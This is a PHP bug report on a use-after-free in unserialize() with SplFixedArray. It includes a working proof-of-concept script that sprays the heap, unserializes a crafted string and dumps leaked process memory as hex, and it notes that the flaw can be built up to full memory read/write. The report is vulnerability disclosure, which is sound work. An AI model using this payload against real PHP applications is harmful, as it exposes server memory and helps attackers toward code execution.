Description:
------------
Use After Free in unserialize() with SplFixedArray. It is possible to leak memory and create gadgets to gain full memory read/write access. Demo of memory leak in script bellow.


Test script:
---------------
<?php
for ($i=0; $i<1000; $i++)
$z[$i] = str_repeat('A', 10);

$s = 'O:13:"SplFixedArray":2:{i:0;s:10:"1234567890";i:1;r:2;}';
$o = unserialize($s);
$b = &$o[1];
$o[1] = 0xbaad;

for ($i=0; $i<4000; $i++) {
  echo(bin2hex($o[0][$i]));
}
echo("\n");

Expected result:
----------------
31323334353637383930

Actual result:
--------------
31743d5554462d3800300061790000000100000006000000000000000a00000031323334353637383930006179000000001147b50d0000000614000000000000adba00001ab9ffbf0400000000000000801147b5000000...
